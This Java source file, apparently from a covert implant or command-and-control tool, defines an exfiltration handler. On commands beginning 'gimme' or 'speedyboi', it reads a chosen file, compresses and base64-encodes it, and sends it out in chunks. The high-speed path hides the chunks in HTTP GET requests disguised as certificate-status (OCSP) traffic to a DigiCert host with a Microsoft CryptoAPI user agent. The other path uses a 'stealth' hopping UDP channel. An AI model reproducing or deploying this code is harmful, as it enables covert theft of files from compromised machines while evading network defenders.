package exfilfunctions;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Base64;
import java.util.zip.GZIPOutputStream;

import networking.MultiserviceStealthUDPSocket;
import networking.NetUtil;

public class ExfilCommandHandler {
	public ExfilCommandHandler(){
		
	}
	
	public boolean checkExfil(String input){
		if(input.startsWith("gimme")){
			return true;
		}
		else{
			return false;
		}
	}
	
	String highSpeedHTTPOutHead = "GET /";
	String highSpeedHTTPOutTail = "%3D HTTP/1.1\r\nConnection: Keep-Alive\r\nAccept: */*\r\nUser-Agent: Microsoft-CryptoAPI/6.3\r\nHost: ocsp.digicert.com\r\n\r\n";
	public String highSpeedExfiltrate(String command, Socket httpSock){
		try{
			System.out.println("[‼]High Speed Exfil Begins");
			System.out.println("[d] Proceessing Command: "+command);
			command=command.substring(0,command.length()-command.length()%3);
			String path = command.split("\"")[1];
			int waitTime = Integer.parseInt((command.substring(command.lastIndexOf('\"')+2).trim()));
			System.out.println("[d] Determined Path: ");
			System.out.println(path);
			System.out.println("[d] Wait time (ms): "+waitTime );
			FileInputStream fis = new FileInputStream(new File(path));
			int c;
			ArrayList<Byte> exfilBytes = new ArrayList<Byte>();
			while ((c = fis.read()) != -1) {
				exfilBytes.add((byte) c);
	        }
			byte[] exfilByteArray = new byte[exfilBytes.size()];
			for(int i = 0; i < exfilByteArray.length; i++){
				exfilByteArray[i]=exfilBytes.get(i);
			}
			ByteArrayOutputStream exfilByteStream = new ByteArrayOutputStream(exfilByteArray.length);
			GZIPOutputStream gzipper = new GZIPOutputStream(exfilByteStream);
			gzipper.write(exfilByteArray);
			gzipper.close();
			byte[] gzippedExfilBytes = exfilByteStream.toByteArray();
			System.out.println("[+] Data Read Complete");
			String b64Data = new String(Base64.getEncoder().encode(gzippedExfilBytes));
			ArrayList<String> b64Chunks = NetUtil.getPartsRandB64Pad(b64Data, 85);
			String reassembledData = "";
			for(String chunk : b64Chunks){
				if(chunk.indexOf('*')!=-1){
					reassembledData+=chunk.substring(0, chunk.indexOf('*'));
				}else{
					reassembledData+=chunk;
				}
			}
			System.out.println(reassembledData);
			System.out.println(b64Data);
			System.out.println(reassembledData.equals(b64Data));
			Base64.getDecoder().decode(b64Data.getBytes());
			Base64.getDecoder().decode(reassembledData.getBytes());
			for(String chunk : b64Chunks){
				String message = highSpeedHTTPOutHead+chunk+highSpeedHTTPOutTail;
				System.out.println("[D] Sending Data: ");
				System.out.println(chunk);
				httpSock.getOutputStream().write(message.getBytes());
				httpSock.getOutputStream().flush();
				System.out.println("[.] Data sent. Awaiting response...");
				readAll(httpSock);
				System.out.println("[!] Response Recieved!");
				Thread.sleep(waitTime);
			}
			System.out.println("[D] Exfil done!");
			return "Exfil Success!";
		}catch(Exception e){
			return e.getMessage();
		}
		
		
	}
	private String readAll(Socket socket) throws IOException {
		int c;
	    String raw = "";
	    int iterator = 0;
	    do {
	        c = socket.getInputStream().read();
	        raw+=(char)c;
	        iterator++;
	    } while(socket.getInputStream().available()>0);
	    return raw;
	}
	public String handleExfil(String command, MultiserviceStealthUDPSocket msus) {
		try{
			System.out.println("[+] Exfil Begins");
			System.out.println("[d] Proceessing Command: "+command);
			command=command.substring(0,command.length()-command.length()%3);
			String path = command.split("\"")[1];
			int waitTime = Integer.parseInt((command.substring(command.lastIndexOf('\"')+2).trim()));
			System.out.println("[d] Determined Path: ");
			System.out.println(path);
			System.out.println("[d] Wait time (ms): "+waitTime );
			//String[] commandParts = command.split(" ");
			//String path = commandParts[1];
			//int waitTime = Integer.parseInt(commandParts[2]);
			FileInputStream fis = new FileInputStream(new File(path));
			int c;
			ArrayList<Byte> exfilBytes = new ArrayList<Byte>();
			while ((c = fis.read()) != -1) {
				exfilBytes.add((byte) c);
	        }
			byte[] exfilByteArray = new byte[exfilBytes.size()];
			for(int i = 0; i < exfilByteArray.length; i++){
				exfilByteArray[i]=exfilBytes.get(i);
			}
			System.out.println("[+] Data Read Complete");
			msus.sendHoppingStealthMessage(exfilByteArray, waitTime);
			return "Exfil Success!";
			
		}catch(Exception e){
			e.printStackTrace();
			return "Exfil Failed! \n"+e.toString();
		}
		
	}

	public boolean checkHighSpeedExfil(String command) {
		if(command.startsWith("speedyboi")){
			return true;
		}
		else{
			return false;
		}
	}
}
